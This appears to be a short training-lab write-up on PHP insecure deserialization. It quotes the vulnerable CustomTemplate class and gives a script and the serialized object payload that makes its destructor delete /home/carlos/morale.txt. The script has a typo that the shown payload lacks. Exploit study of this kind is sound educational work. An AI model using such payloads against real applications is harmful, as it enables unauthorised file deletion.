## Lab Description :

![image](https://github.com/user-attachments/assets/d3c37505-cb75-4b07-a22e-667f4a133a26)

## Solution :

![image](https://github.com/user-attachments/assets/3aa95695-4919-41ca-8fe7-3bdb42650063)

![image](https://github.com/user-attachments/assets/4c3c2db4-ff87-4eae-9d75-b62450eebc01)
![image](https://github.com/user-attachments/assets/45cd0741-ef97-4d0f-8724-097f8401f999)
![image](https://github.com/user-attachments/assets/32a84511-3746-40b2-b3e6-b86b4a2a9e28)

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

```
<?php

class CustomTemplate {
   public $lock_file_path='/home/carlos/morale,txt';
    }

$obj = new CustomTemplate();
$test = serialize($obj);
echo $test;
?>
```


```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```


![image](https://github.com/user-attachments/assets/7c6347fb-d5de-416e-af7e-903c9f6adf2a)

